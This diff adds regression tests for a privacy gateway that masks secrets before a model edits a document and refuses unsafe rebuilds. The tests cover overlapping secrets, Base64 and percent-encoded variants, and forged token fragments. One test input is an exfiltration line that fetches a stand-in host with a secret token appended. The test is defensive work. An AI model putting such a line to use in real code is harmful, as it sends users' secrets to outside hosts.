@@ -410,3 +410,149 @@ describe("privacy gateway: rebuildDocument", () => {
     assert.deepEqual(outcome, { ok: false, code: "protected_span_violation" });
   });
 });
+
+// Regression cases from docs/reviews/2026-11-12-cross-review-privacy.md (fake secrets only).
+describe("privacy gateway: cross review fixes", () => {
+  const S = "fake-review-S-0050";
+
+  it("C1-F 1: changing the context of a protected line is protected_span_violation", () => {
+    const gateway = gatewayFor([S]);
+    const original = asRawText(`const k = "${S}";\nconsole.log("hi");\n`);
+    const masked = maskOk(gateway, original);
+    const [t] = tokensIn(masked);
+    assert.ok(t);
+    const exfil = `fetch("https://x.invalid/?k=" + "${t}");\nconsole.log("hi");\n`;
+    assert.deepEqual(gateway.rebuildDocument({ original, maskedNext: exfil }), {
+      ok: false,
+      code: "protected_span_violation",
+    });
+    const sameLineEdit = masked.replace(`const k = "${t}";`, `let k = "${t}";`);
+    assert.deepEqual(gateway.rebuildDocument({ original, maskedNext: sameLineEdit }), {
+      ok: false,
+      code: "protected_span_violation",
+    });
+    const crDropped = asRawText(`const k = "${S}";\r\nnext\r\n`);
+    const crMasked = maskOk(gateway, crDropped);
+    assert.deepEqual(
+      gateway.rebuildDocument({ original: crDropped, maskedNext: crMasked.replace("\r\nnext", "\nnext") }),
+      { ok: false, code: "protected_span_violation" },
+    );
+  });
+
+  it("C1-F 1: reordering protected lines is protected_span_violation", () => {
+    const gateway = gatewayFor([S, OTHER]);
+    const original = asRawText(`a = ${S}\r\nb = ${OTHER}\r\n`);
+    const masked = maskOk(gateway, original);
+    const [first, second] = masked.split("\r\n");
+    assert.ok(first !== undefined && second !== undefined);
+    assert.deepEqual(gateway.rebuildDocument({ original, maskedNext: `${second}\r\n${first}\r\n` }), {
+      ok: false,
+      code: "protected_span_violation",
+    });
+  });
+
+  it("C1-F 1: unprotected lines may be added, removed and changed around protected lines", () => {
+    const gateway = gatewayFor([S]);
+    const original = asRawText(`# 제목\r\nkey=${S}\r\n삭제할 줄\r\n끝\r\n`);
+    const masked = maskOk(gateway, original);
+    const maskedNext = masked.replace("# 제목\r\n", "# 새 제목\r\n추가 줄\n").replace("삭제할 줄\r\n", "");
+    const outcome = gateway.rebuildDocument({ original, maskedNext });
+    assert.deepEqual(outcome, { ok: true, text: `# 새 제목\r\n추가 줄\nkey=${S}\r\n끝\r\n` });
+  });
+
+  it("C1-F 4 (side effect of rule 1): swapping a literal token line with the secret line is refused", () => {
+    const gateway = gatewayFor([S]);
+    const [t] = tokensIn(maskOk(gateway, S));
+    assert.ok(t);
+    const original = asRawText(`literal ${t}\nreal ${S}\n`);
+    const masked = maskOk(gateway, original);
+    assert.equal(masked, `literal ${t}\nreal ${t}\n`);
+    assert.deepEqual(gateway.rebuildDocument({ original, maskedNext: `literal ${t}\nreal ${t}\nx\n` }), {
+      ok: true,
+      text: `${original}x\n`,
+    });
+    assert.deepEqual(gateway.rebuildDocument({ original, maskedNext: `real ${t}\nliteral ${t}\n` }), {
+      ok: false,
+      code: "protected_span_violation",
+    });
+  });
+
+  it("C1-F 2: no part of either overlapping secret stays in the masked text", () => {
+    const secrets = ["zz-fa", "fake-key-123456"];
+    const gateway = gatewayFor(secrets);
+    const masked = maskOk(gateway, "zz-fake-key-123456");
+    assert.match(masked, new RegExp(`^${PRIVACY_TOKEN_PATTERN_SOURCE}$`));
+    const framed = maskOk(gateway, "x zz-fake-key-123456 y");
+    assert.equal(framed, `x ${masked} y`);
+    const resolved = gateway.resolveToolArgs({ args: { v: masked }, restoreFields: ["v"], documentFields: [] });
+    assert.deepEqual(resolved, { ok: true, args: { v: "zz-fake-key-123456" }, restoredFields: ["v"] });
+    // Touching matches merge as well.
+    const touching = maskOk(gateway, "zz-fafake-key-123456!");
+    assert.equal(tokensIn(touching).length, 1);
+    assert.equal(touching.replace(new RegExp(PRIVACY_TOKEN_PATTERN_SOURCE), ""), "!");
+  });
+
+  it("C1-F 3: an existing CODARYN_SECRET fragment is masked and other lines stay editable", () => {
+    const gateway = gatewayFor([S]);
+    const original = asRawText(
+      'export const PRIVACY_TOKEN_PREFIX = "[[CODARYN_SECRET:";\r\n// codaryn_secret 소문자\r\nconst a = 1;\r\n',
+    );
+    const masked = maskOk(gateway, original);
+    assert.equal(/CODARYN_SECRET/i.test(masked.replace(new RegExp(PRIVACY_TOKEN_PATTERN_SOURCE, "g"), "")), false);
+    assert.equal(tokensIn(masked).length, 2);
+    const maskedNext = masked.replace("const a = 1;", "const a = 2;");
+    const outcome = gateway.rebuildDocument({ original, maskedNext });
+    assert.deepEqual(outcome, { ok: true, text: original.replace("const a = 1;", "const a = 2;") });
+    assert.deepEqual(gateway.rebuildDocument({ original, maskedNext: masked }), { ok: true, text: original });
+    // A fragment written by the model is still refused.
+    assert.deepEqual(gateway.rebuildDocument({ original, maskedNext: `${masked}CODARYN_SECRET\r\n` }), {
+      ok: false,
+      code: "invalid_token",
+    });
+    const args = gateway.resolveToolArgs({ args: { text: "CODARYN_SECRET" }, restoreFields: [], documentFields: [] });
+    assert.deepEqual(args, { ok: false, code: "invalid_token", field: "text" });
+  });
+
+  it("C1-F 5: a secret that starts right before a token does not break mask(mask(x))", () => {
+    const gateway = gatewayFor(["fake-x[[", OTHER]);
+    const once = maskOk(gateway, `a fake-x${OTHER} b`);
+    assert.equal(maskOk(gateway, once), once);
+    const withBoth = maskOk(gateway, `p fake-x[[ q ${OTHER} r`);
+    assert.equal(maskOk(gateway, withBoth), withBoth);
+    assert.equal(tokensIn(withBoth).length, 2);
+  });
+
+  it("C1-F 6: Base64 variants are masked with or without padding, standard or URL alphabet", () => {
+    const review = "fake/secret+1";
+    const urlSecret = "fake-ü?>-0046";
+    const gateway = gatewayFor([review, urlSecret]);
+    const b64 = Buffer.from(urlSecret, "utf8").toString("base64");
+    const b64url = Buffer.from(urlSecret, "utf8").toString("base64url");
+    assert.notEqual(b64.replace(/=+$/, ""), b64url);
+    for (const variant of [
+      "ZmFrZS9zZWNyZXQrMQ",
+      "ZmFrZS9zZWNyZXQrMQ==",
+      b64,
+      b64.replace(/=+$/, ""),
+      b64url,
+      `${b64url}=`,
+    ]) {
+      const masked = maskOk(gateway, `v:${variant};`);
+      assert.equal(tokensIn(masked).length, 1, variant);
+      assert.equal(masked.includes(variant.slice(0, 8)), false, variant);
+    }
+  });
+
+  it("C1-F 6: lowercase percent encoding and LF/CRLF forms of multi-line secrets are masked", () => {
+    const gateway = gatewayFor(["fake/secret+1", "fake-line-1\nfake-line-2", "fake-crlf-1\r\nfake-crlf-2"]);
+    const lower = maskOk(gateway, "q=fake%2fsecret%2b1&x=1");
+    assert.equal(lower.includes("fake%2f"), false);
+    assert.equal(tokensIn(lower).length, 1);
+    const crlfFile = maskOk(gateway, "a\r\nfake-line-1\r\nfake-line-2\r\nb");
+    assert.equal(crlfFile.includes("fake-line"), false);
+    const lfFile = maskOk(gateway, "a\nfake-crlf-1\nfake-crlf-2\nb");
+    assert.equal(lfFile.includes("fake-crlf"), false);
+    const jsonCrlf = maskOk(gateway, JSON.stringify({ v: "fake-line-1\r\nfake-line-2" }));
+    assert.equal(jsonCrlf.includes("fake-line"), false);
+  });
+});
